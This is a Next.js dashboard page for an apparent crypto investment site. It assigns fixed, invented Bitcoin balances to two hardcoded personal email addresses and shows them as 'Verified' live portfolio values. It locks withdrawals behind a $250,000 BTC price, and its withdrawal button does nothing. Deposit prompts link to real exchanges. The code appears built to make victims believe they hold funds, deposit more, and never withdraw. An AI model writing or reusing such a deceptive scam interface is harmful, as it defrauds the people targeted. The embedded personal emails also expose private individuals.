"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";

const SPECIAL_ACCOUNTS = {
    "donaldflynn144@gmail.com": {
        baseBtc: 221.84995699,
    },
    "waszczukfamily@gmail.com": {
        baseBtc: 89.7552,
    },
};

const WITHDRAW_UNLOCK_BTC_PRICE = 250000;

const DEPOSIT_LINKS = [
    { name: "Blockchain", url: "https://www.blockchain.com" },
    { name: "Bitcoin.com", url: "https://www.bitcoin.com" },
    { name: "Crypto.com", url: "https://crypto.com" },
    { name: "Coinbase", url: "https://www.coinbase.com" },
    { name: "Cash App", url: "https://cash.app" },
];

const MAX_POINTS = 60;
const STORAGE_KEY = "btc_price_points_v1";

const REFRESH_MS = 12 * 60 * 60 * 1000;

function safeReadPoints() {
    try {
        const raw = localStorage.getItem(STORAGE_KEY);
        if (!raw) return [];
        const parsed = JSON.parse(raw);
        if (!Array.isArray(parsed)) return [];
        return parsed
            .map((p) => ({ ts: Number(p.ts), price: Number(p.price) }))
            .filter((p) => Number.isFinite(p.ts) && Number.isFinite(p.price))
            .sort((a, b) => a.ts - b.ts)
            .slice(-MAX_POINTS);
    } catch {
        return [];
    }
}

function safeWritePoints(points) {
    try {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(points.slice(-MAX_POINTS)));
    } catch {
    }
}

function clamp(n, a, b) {
    return Math.max(a, Math.min(b, n));
}

function formatUSD(n) {
    if (typeof n !== "number" || Number.isNaN(n)) return "—";
    return n.toLocaleString(undefined, { style: "currency", currency: "USD" });
}

function formatBTC(n) {
    if (typeof n !== "number" || Number.isNaN(n)) return "—";
    return n.toLocaleString(undefined, {
        minimumFractionDigits: 2,
        maximumFractionDigits: 8,
    });
}

function formatCompactUSD(n) {
    if (!Number.isFinite(n)) return "—";
    return n.toLocaleString(undefined, {
        style: "currency",
        currency: "USD",
        notation: "compact",
        maximumFractionDigits: 2,
    });
}

function pct(n) {
    if (!Number.isFinite(n)) return "—";
    const sign = n >= 0 ? "+" : "";
    return `${sign}${n.toFixed(2)}%`;
}

function softMaskEmail(email) {
    if (!email) return "—";
    const [a, b] = String(email).split("@");
    if (!b) return email;
    const head = a.slice(0, 2);
    const tail = a.slice(-1);
    return `${head}***${tail}@${b}`;
}

function readStoredUser() {
    if (typeof window === "undefined") return null;
    try {
        const raw = localStorage.getItem("user");
        const token = localStorage.getItem("token");
        if (!raw || !token) return null;
        const parsed = JSON.parse(raw);
        return parsed && typeof parsed === "object" ? parsed : null;
    } catch {
        return null;
    }
}

function readStoredPriceSnapshot() {
    if (typeof window === "undefined") return { points: [], price: null, ts: null };
    const saved = safeReadPoints();
    const last = saved[saved.length - 1];
    return {
        points: saved,
        price: last?.price ?? null,
        ts: last?.ts ?? null,
    };
}

function IconBtn({ children, onClick, title }) {
    return (
        <button
            type="button"
            title={title}
            onClick={onClick}
            className="group inline-flex h-10 items-center justify-center rounded-xl border border-[#323b4a] bg-[#151b24] px-3 text-sm font-extrabold text-[var(--text)] shadow-[0_12px_26px_rgba(0,0,0,.3)] transition hover:-translate-y-[1px] hover:bg-[#1b2430]"
        >
            {children}
        </button>
    );
}

function Modal({ open, title, subtitle, onClose, children }) {
    if (!open) return null;

    return (
        <div
            className="fixed inset-0 z-[90] grid place-items-center bg-black/70 p-4"
            onMouseDown={onClose}
            role="dialog"
            aria-modal="true"
        >
            <div
                className="w-full max-w-2xl overflow-hidden rounded-2xl border border-[#303848] bg-[#10151f] shadow-[0_20px_58px_rgba(0,0,0,.62)]"
                onMouseDown={(e) => e.stopPropagation()}
            >
                <div className="flex items-start justify-between gap-3 border-b border-[#2f3847] p-4">
                    <div className="min-w-0">
                        <div className="text-base font-black text-[var(--text)]">{title}</div>
                        {subtitle ? (
                            <div className="mt-1 text-sm font-semibold text-[var(--muted)]">{subtitle}</div>
                        ) : null}
                    </div>

                    <button
                        type="button"
                        onClick={onClose}
                        className="inline-flex h-10 w-10 items-center justify-center rounded-xl border border-[#323b4a] bg-[#161d29] text-[var(--text)] transition hover:bg-[#202a38]"
                        aria-label="Close modal"
                    >
                        ✕
                    </button>
                </div>

                <div className="p-4">{children}</div>
            </div>
        </div>
    );
}

export default function DashboardPage() {
    const router = useRouter();
    const [initialSnapshot] = useState(() => readStoredPriceSnapshot());

    const [user] = useState(() => readStoredUser());
    const [btcPrice, setBtcPrice] = useState(initialSnapshot.price);
    const [btcTs, setBtcTs] = useState(initialSnapshot.ts);
    const [priceError, setPriceError] = useState("");
    const [activeModal, setActiveModal] = useState(null);
    const [points, setPoints] = useState(initialSnapshot.points);
    const animRef = useRef({ raf: null, from: 0, to: 0, start: 0, dur: 700 });

    useEffect(() => {
        if (!user) {
            localStorage.removeItem("token");
            localStorage.removeItem("user");
            router.replace("/login");
        }
    }, [router, user]);

    useEffect(() => {
        let cancelled = false;

        async function loadPrice() {
            setPriceError("");

            try {
                const res = await fetch("/api/btc", { cache: "no-store" });
                const json = await res.json().catch(() => ({}));

                const p = Number(json?.price);
                const ts = json?.ts ? new Date(json.ts).getTime() : Date.now();

                if (cancelled) return;

                if (!Number.isFinite(p) || p <= 0) {
                    setPriceError("Could not load BTC price.");
                    return;
                }

                setBtcPrice(p);
                setBtcTs(ts);

                setPoints((prev) => {
                    const existing = prev.length ? prev : safeReadPoints();
                    const last = existing[existing.length - 1];

                    if (last && last.ts === ts) {
                        safeWritePoints(existing);
                        return existing;
                    }

                    const next = [...existing, { ts, price: p }]
                        .sort((a, b) => a.ts - b.ts)
                        .slice(-MAX_POINTS);

                    safeWritePoints(next);
                    return next;
                });
            } catch {
                if (!cancelled) setPriceError("Could not load BTC price.");
            }
        }

        loadPrice();
        return () => {
            cancelled = true;
        };
    }, []);

    const emailLower = (user?.email || "").toLowerCase();
    const specialAccount = SPECIAL_ACCOUNTS[emailLower];
    const isSpecial = Boolean(specialAccount);

    const btcHoldings = useMemo(() => {
        if (!isSpecial) return 0;
        return specialAccount.baseBtc;
    }, [isSpecial, specialAccount]);

    const displayUsd = useMemo(() => {
        if (!isSpecial || !Number.isFinite(btcPrice) || btcPrice <= 0) return 0;
        return btcHoldings * btcPrice;
    }, [isSpecial, btcHoldings, btcPrice]);

    useEffect(() => {
        if (!isSpecial) return;

        const refreshExactUsd = async () => {
            try {
                const res = await fetch("/api/btc", { cache: "no-store" });
                const json = await res.json().catch(() => ({}));
                const p = Number(json?.price);
                const ts = json?.ts ? new Date(json.ts).getTime() : Date.now();

                if (!Number.isFinite(p) || p <= 0) return;

                setBtcPrice(p);
                setBtcTs(ts);

                setPoints((prev) => {
                    const existing = prev.length ? prev : safeReadPoints();
                    const last = existing[existing.length - 1];

                    if (last && last.ts === ts) {
                        safeWritePoints(existing);
                        return existing;
                    }

                    const next = [...existing, { ts, price: p }]
                        .sort((a, b) => a.ts - b.ts)
                        .slice(-MAX_POINTS);

                    safeWritePoints(next);
                    return next;
                });
            } catch {}
        };

        refreshExactUsd();
        const id = setInterval(refreshExactUsd, REFRESH_MS);
        return () => clearInterval(id);
    }, [isSpecial, btcHoldings]);

    const sessionChange = useMemo(() => {
        if (!isSpecial) return null;

        const arr = points.length ? points : (typeof window !== "undefined" ? safeReadPoints() : []);
        if (arr.length < 2) return null;

        const first = arr[0].price;
        const last = arr[arr.length - 1].price;

        const diff = last - first;
        const p = (diff / (first || 1)) * 100;

        return { diff, pct: p };
    }, [isSpecial, points]);

    const withdrawState = useMemo(() => {
        if (!btcPrice) return { ok: false, ratio: 0 };
        const ratio = clamp(btcPrice / WITHDRAW_UNLOCK_BTC_PRICE, 0, 1);
        return { ok: btcPrice >= WITHDRAW_UNLOCK_BTC_PRICE, ratio };
    }, [btcPrice]);

    function logout() {
        localStorage.removeItem("token");
        localStorage.removeItem("user");
        router.replace("/login");
    }

    if (!user) return null;

    return (
        <main className="relative min-h-screen overflow-hidden py-7 sm:py-8">
            <div
                className="absolute inset-0 bg-cover bg-center bg-no-repeat"
                style={{ backgroundImage: "url('/assets/images/hero1.webp')" }}
            />
            <div className="absolute inset-0 bg-[linear-gradient(180deg,rgba(5,7,10,.86)_0%,rgba(7,9,13,.9)_100%)]" />

            <div className="relative z-10 mx-auto w-full max-w-[1380px] px-4 sm:px-5 lg:px-7">
                <div className="relative overflow-hidden rounded-3xl border border-[#303a4b] bg-[#0f141d] p-5 shadow-[0_20px_56px_rgba(0,0,0,.5)]">
                    <div className="flex flex-wrap items-start justify-between gap-4">
                        <div className="flex min-w-0 items-start gap-3 sm:items-center sm:gap-4">
                            <div className="relative h-[110px] w-[110px] shrink-0 overflow-hidden rounded-2xl border border-[#3a465a] bg-gradient-to-br from-[rgba(221,192,138,.92)] to-[rgba(164,134,84,.78)] shadow-[0_16px_40px_rgba(0,0,0,.35)] sm:h-[118px] sm:w-[118px]">
                                <div className="grid h-full w-full place-items-center text-lg font-black text-[#061023]">
                                    {String(user.username || "U").slice(0, 1).toUpperCase()}
                                </div>
                            </div>

                            <div className="min-w-0">
                                <div className="flex items-center gap-2">
                                    <span className="inline-flex h-7 w-7 items-center justify-center rounded-xl border border-[#39465a] bg-[#1a2230] shadow-[0_10px_24px_rgba(0,0,0,.25)]">
                                        <img
                                            src="/assets/svgs/logo.svg?v=btc-shield-1"
                                            alt="Logo"
                                            className="h-4 w-4 opacity-90"
                                        />
                                    </span>

                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        Profile Dashboard
                                    </div>
                                </div>

                                <div className="mt-1 truncate text-xl font-black tracking-tight text-[var(--text)] sm:text-2xl">
                                    {user.fullName || user.username}
                                </div>

                                <div className="mt-1 flex flex-wrap items-center gap-2 text-sm font-semibold text-[var(--muted)]">
                                    <span className="rounded-full border border-[#333d4e] bg-[#171f2b] px-3 py-1">
                                        @<span className="font-black text-[var(--text)]">{user.username || "—"}</span>
                                    </span>
                                    <span className="rounded-full border border-[#333d4e] bg-[#171f2b] px-3 py-1">
                                        {softMaskEmail(user.email)}
                                    </span>

                                    {btcPrice ? (
                                        <span className="rounded-full border border-[#333d4e] bg-[#171f2b] px-3 py-1">
                                            BTC:{" "}
                                            <span className="font-black text-[var(--text)]">{formatUSD(btcPrice)}</span>
                                        </span>
                                    ) : (
                                        <span className="rounded-full border border-[#333d4e] bg-[#171f2b] px-3 py-1">
                                            BTC:{" "}
                                            <span className="font-black text-[var(--text)]">Loading…</span>
                                        </span>
                                    )}
                                </div>
                            </div>
                        </div>

                        <div className="flex flex-wrap gap-2">
                            <IconBtn title="Deposit" onClick={() => setActiveModal("deposit")}>
                                Deposit
                            </IconBtn>
                            <IconBtn title="Withdraw" onClick={() => setActiveModal("withdraw")}>
                                Withdraw
                            </IconBtn>
                            <IconBtn title="Logout" onClick={logout}>
                                Logout
                            </IconBtn>
                        </div>
                    </div>

                    <div className="mt-4 flex flex-wrap items-center justify-between gap-3 border-t border-[#2f3948] pt-4">
                        <div className="flex flex-wrap items-center gap-2">
                            {btcTs ? (
                                <span className="inline-flex items-center gap-1 rounded-full border border-[#333d4f] bg-[#171f2b] px-3 py-1 text-xs font-bold text-[#dde1e8]">
                                    Updated:{" "}
                                    <span className="font-black text-[var(--text)]">
                                        {new Date(btcTs).toLocaleString()}
                                    </span>
                                </span>
                            ) : null}
                        </div>

                        {sessionChange ? (
                            <div
                                className={`inline-flex items-center rounded-full border border-[#333d4f] bg-[#171f2b] px-3 py-1 text-xs font-extrabold ${
                                    sessionChange.diff >= 0 ? "text-[#7be7c0]" : "text-[#f9a792]"
                                }`}
                            >
                                {sessionChange.diff >= 0 ? "▲" : "▼"}{" "}
                                {formatUSD(Math.abs(sessionChange.diff))} (
                                {Math.abs(sessionChange.pct).toFixed(2)}%)
                            </div>
                        ) : (
                            <div className="muted text-sm font-extrabold">
                                {priceError ? priceError : "—"}
                            </div>
                        )}
                    </div>
                </div>

                <div className="mt-5 grid gap-4 lg:grid-cols-[1.28fr_.82fr]">
                    <div className="rounded-3xl border border-[#2f3949] bg-[#101621] p-5 shadow-[0_20px_56px_rgba(0,0,0,.38)]">
                        <div className="flex items-start justify-between gap-4">
                            <div>
                                <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                    Total Portfolio Value
                                </div>

                                <div className="mt-3 text-[clamp(2.2rem,4vw,3.25rem)] font-black leading-[1.05] tracking-tight text-[var(--text)]">
                                    {isSpecial ? formatUSD(displayUsd) : formatUSD(0)}
                                </div>

                                <div className="mt-2 text-sm font-semibold text-[var(--muted)]">
                                    Live valuation based on Bitcoin price feed.
                                </div>
                            </div>

                            <div className="grid gap-2">
                                <div className="text-right text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                    Account
                                </div>
                                <div className="text-right text-sm font-black text-[var(--text)]">
                                    {isSpecial ? "Verified" : "Standard"}
                                </div>
                            </div>
                        </div>

                        <div className="mt-5 grid gap-3 sm:grid-cols-2">
                            <div className="rounded-2xl border border-[#323c4d] bg-[#151e2a] p-4">
                                <div className="flex items-center justify-between gap-3">
                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        Bitcoin Holdings
                                    </div>
                                    <img
                                        src="/assets/svgs/bitcoin2.svg"
                                        alt="BTC"
                                        className="h-5 w-5 opacity-90"
                                    />
                                </div>

                                <div className="mt-2 text-xl font-black text-[var(--text)]">
                                    {isSpecial && btcPrice ? `${formatBTC(btcHoldings)} BTC` : "—"}
                                </div>

                                <div className="mt-1 text-sm font-semibold text-[var(--muted)]">
                                    {btcPrice ? `1 BTC = ${formatUSD(btcPrice)}` : "Fetching price…"}
                                </div>
                            </div>

                            <div className="rounded-2xl border border-[#323c4d] bg-[#151e2a] p-4">
                                <div className="flex items-center justify-between gap-3">
                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        USD Value (Live)
                                    </div>
                                    <img src="/assets/svgs/usd.svg" alt="USD" className="h-5 w-5 opacity-90" />
                                </div>

                                <div className="mt-2 text-xl font-black text-[var(--text)]">
                                    {isSpecial ? formatUSD(displayUsd) : formatUSD(0)}
                                </div>
                            </div>
                        </div>

                        <div className="mt-4 flex flex-wrap items-center justify-between gap-3 rounded-2xl border border-[#323c4d] bg-[#161e2b] p-4">
                            <div className="text-sm font-semibold text-[var(--muted)]">
                                Estimated portfolio (compact):{" "}
                                <span className="font-black text-[var(--text)]">
                                    {isSpecial ? formatCompactUSD(displayUsd) : formatCompactUSD(0)}
                                </span>
                            </div>

                            <button
                                type="button"
                                onClick={() => setActiveModal("deposit")}
                                className="inline-flex items-center justify-center rounded-lg border border-[rgba(221,192,138,.35)] bg-[var(--gold)] px-4 py-2 text-sm font-extrabold text-[#1c160c] transition hover:bg-[var(--gold-strong)]"
                            >
                                Add Funds
                            </button>
                        </div>
                    </div>

                    <div className="grid gap-4">
                        <div className="rounded-3xl border border-[#2f3949] bg-[#101621] p-5 shadow-[0_20px_56px_rgba(0,0,0,.38)]">
                            <div className="flex items-start justify-between gap-3">
                                <div>
                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        Withdrawal Access
                                    </div>
                                    <div className="mt-1 text-lg font-black text-[var(--text)]">Unlock Bitcoin</div>
                                    <div className="mt-2 text-sm font-semibold text-[var(--muted)]">
                                        Withdrawals open when BTC reaches{" "}
                                        <span className="font-black text-[var(--text)]">
                                            {formatUSD(WITHDRAW_UNLOCK_BTC_PRICE)}
                                        </span>
                                        .
                                    </div>
                                </div>

                                <div
                                    className={`rounded-full border border-[#343e4e] bg-[#171f2b] px-3 py-1 text-sm font-black ${
                                        withdrawState.ok
                                            ? "text-[rgba(221,192,138,.95)]"
                                            : "text-[rgba(255,190,120,.95)]"
                                    }`}
                                >
                                    {withdrawState.ok ? "Unlocked" : "Locked"}
                                </div>
                            </div>

                            <div className="mt-4">
                                <div className="h-3 w-full overflow-hidden rounded-full border border-[#333e4f] bg-[#151d29]">
                                    <div
                                        className="h-full rounded-full"
                                        style={{
                                            width: `${Math.round(withdrawState.ratio * 100)}%`,
                                            background:
                                                "linear-gradient(90deg, rgba(221,192,138,.95), rgba(164,134,84,.75))",
                                        }}
                                    />
                                </div>

                                <div className="mt-3 flex flex-wrap items-center justify-between gap-3">
                                    <div className="text-sm font-semibold text-[var(--muted)]">
                                        Current BTC:{" "}
                                        <span className="font-black text-[var(--text)]">
                                            {btcPrice ? formatUSD(btcPrice) : "—"}
                                        </span>
                                    </div>

                                    {!withdrawState.ok ? (
                                        <div className="flex items-center gap-2">
                                            <div className="text-sm font-extrabold text-[var(--muted)]">
                                                Awaiting unlock…
                                            </div>
                                            <div className="h-4 w-4 animate-spin rounded-full border-2 border-white/20 border-t-[rgba(221,192,138,.95)]" />
                                        </div>
                                    ) : (
                                        <div className="text-sm font-extrabold text-[var(--muted)]">
                                            You can withdraw now.
                                        </div>
                                    )}
                                </div>

                                <button
                                    type="button"
                                    onClick={() => setActiveModal("withdraw")}
                                    className="mt-4 inline-flex w-full items-center justify-center rounded-lg border border-[#333d4f] bg-[#151d29] px-4 py-2.5 text-sm font-bold text-[#eef2f7] transition hover:bg-[#1d2735]"
                                >
                                    Open Withdraw
                                </button>
                            </div>
                        </div>

                        <div className="rounded-3xl border border-[#2f3949] bg-[#101621] p-5 shadow-[0_20px_56px_rgba(0,0,0,.38)]">
                            <div className="flex items-center justify-between gap-3">
                                <div>
                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        Quick Actions
                                    </div>
                                    <div className="mt-1 text-lg font-black text-[var(--text)]">Move Funds</div>
                                </div>
                            </div>

                            <div className="mt-4 grid gap-2">
                                <button
                                    type="button"
                                    onClick={() => setActiveModal("deposit")}
                                    className="inline-flex w-full items-center justify-center rounded-lg border border-[rgba(221,192,138,.35)] bg-[var(--gold)] px-4 py-2.5 text-sm font-extrabold text-[#1c160c] transition hover:bg-[var(--gold-strong)]"
                                >
                                    Deposit
                                </button>

                                <button
                                    type="button"
                                    onClick={() => setActiveModal("withdraw")}
                                    className="inline-flex w-full items-center justify-center rounded-lg border border-[#333d4f] bg-[#151d29] px-4 py-2.5 text-sm font-bold text-[#eef2f7] transition hover:bg-[#1d2735]"
                                >
                                    Withdraw
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <Modal open={activeModal === "deposit"} title="Deposit" onClose={() => setActiveModal(null)}>
                    <div className="grid gap-3">
                        <div className="rounded-2xl border border-[#323c4d] bg-[#141c28] p-4">
                            <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                Suggested Providers
                            </div>

                            <div className="mt-3 grid gap-2">
                                {DEPOSIT_LINKS.map((x) => (
                                    <a
                                        key={x.url}
                                        href={x.url}
                                        target="_blank"
                                        rel="noreferrer"
                                        className="group flex items-center justify-between gap-3 rounded-2xl border border-[#323c4d] bg-[#161f2d] px-4 py-3 transition hover:-translate-y-[1px] hover:bg-[#202a39]"
                                    >
                                        <span className="font-black text-[var(--text)]">{x.name}</span>
                                        <span className="text-sm font-extrabold text-[var(--muted)] group-hover:text-[var(--text)]">
                                            Open ↗
                                        </span>
                                    </a>
                                ))}
                            </div>
                        </div>

                        <button
                            type="button"
                            className="inline-flex w-full items-center justify-center rounded-lg border border-[#333d4f] bg-[#151d29] px-4 py-2.5 text-sm font-bold text-[#eef2f7] transition hover:bg-[#1d2735]"
                            onClick={() => setActiveModal(null)}
                        >
                            Done
                        </button>
                    </div>
                </Modal>

                <Modal open={activeModal === "withdraw"} title="Withdraw" onClose={() => setActiveModal(null)}>
                    <div className="grid gap-3">
                        <div className="rounded-2xl border border-[#323c4d] bg-[#141c28] p-4">
                            <div className="flex items-start justify-between gap-3">
                                <div>
                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        Requirement
                                    </div>
                                    <div className="mt-2 text-lg font-black text-[var(--text)]">
                                        BTC must reach {formatUSD(WITHDRAW_UNLOCK_BTC_PRICE)}
                                    </div>
                                    <div className="mt-1 text-sm font-semibold text-[var(--muted)]">
                                        Current BTC:{" "}
                                        <span className="font-black text-[var(--text)]">
                                            {btcPrice ? formatUSD(btcPrice) : "—"}
                                        </span>
                                    </div>
                                </div>

                                {!withdrawState.ok ? (
                                    <div className="flex items-center gap-2">
                                        <div className="h-4 w-4 animate-spin rounded-full border-2 border-white/20 border-t-[rgba(221,192,138,.95)]" />
                                        <div className="text-sm font-black text-[var(--muted)]">Locked</div>
                                    </div>
                                ) : (
                                    <div className="rounded-full border border-[#343e4e] bg-[#171f2b] px-3 py-1 text-sm font-black text-[rgba(221,192,138,.95)]">
                                        Unlocked
                                    </div>
                                )}
                            </div>

                            <div className="mt-4">
                                <div className="h-3 w-full overflow-hidden rounded-full border border-[#333e4f] bg-[#151d29]">
                                    <div
                                        className="h-full rounded-full"
                                        style={{
                                            width: `${Math.round(withdrawState.ratio * 100)}%`,
                                            background:
                                                "linear-gradient(90deg, rgba(221,192,138,.95), rgba(164,134,84,.75))",
                                        }}
                                    />
                                </div>

                                <div className="mt-2 text-sm font-extrabold text-[var(--muted)]">
                                    Progress:{" "}
                                    <span className="text-[var(--text)]">{Math.round(withdrawState.ratio * 100)}%</span>
                                </div>
                            </div>

                            <button
                                type="button"
                                className="mt-4 inline-flex w-full items-center justify-center rounded-lg border border-[#333d4f] bg-[#151d29] px-4 py-2.5 text-sm font-bold text-[#eef2f7] transition hover:bg-[#1d2735] disabled:cursor-not-allowed disabled:opacity-60"
                                disabled={!withdrawState.ok}
                                onClick={() => {}}
                            >
                                Request Withdrawal
                            </button>

                            <div className="mt-2 text-sm font-semibold text-[var(--muted)]">
                                If locked, it will become available automatically once BTC reaches the target.
                            </div>
                        </div>

                        <button
                            type="button"
                            className="inline-flex w-full items-center justify-center rounded-lg border border-[#333d4f] bg-[#151d29] px-4 py-2.5 text-sm font-bold text-[#eef2f7] transition hover:bg-[#1d2735]"
                            onClick={() => setActiveModal(null)}
                        >
                            Close
                        </button>
                    </div>
                </Modal>
            </div>
        </main>
    );
}
